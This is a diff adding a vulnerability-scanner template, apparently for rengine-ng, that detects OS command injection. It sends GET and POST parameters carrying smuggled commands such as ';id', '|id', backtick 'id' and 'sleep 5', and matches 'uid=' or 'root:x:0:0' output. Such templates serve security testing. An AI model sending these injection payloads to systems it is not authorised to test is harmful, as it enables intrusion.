@@ -1,0 +1,67 @@
+id: command-injection
+
+info:
+  name: OS Command Injection
+  author: rengine-ng
+  severity: critical
+  description: Detects OS command injection vulnerabilities
+  tags: rce,command-injection,vulnerability
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-78
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd=id"
+      - "{{BaseURL}}/?exec=id"
+      - "{{BaseURL}}/?command=id"
+      - "{{BaseURL}}/?execute=id"
+      - "{{BaseURL}}/?ping=127.0.0.1;id"
+      - "{{BaseURL}}/?host=127.0.0.1|id"
+      - "{{BaseURL}}/?ip=127.0.0.1`id`"
+      - "{{BaseURL}}/?name=test;id"
+      - "{{BaseURL}}/?search=test|id"
+      - "{{BaseURL}}/?q=;id;"
+      - "{{BaseURL}}/?input=%60id%60"
+      - "{{BaseURL}}/?param=;id;#"
+      # Time-based blind detection
+      - "{{BaseURL}}/?cmd=sleep+5"
+      - "{{BaseURL}}/?ip=127.0.0.1;sleep+5"
+      - "{{BaseURL}}/?host=;ping+-c+5+127.0.0.1"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\\([a-z]+\\)"
+          - "gid=[0-9]+\\([a-z]+\\)"
+          - "root:x:0:0"
+
+      - type: word
+        part: body
+        words:
+          - "uid=0(root)"
+          - "uid=33(www-data)"
+          - "uid=1000"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/submit"
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/execute"
+      - "{{BaseURL}}/api/execute"
+      - "{{BaseURL}}/api/run"
+
+    body: "cmd=id&input=;id;&q=test|id"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\\([a-z]+\\)"
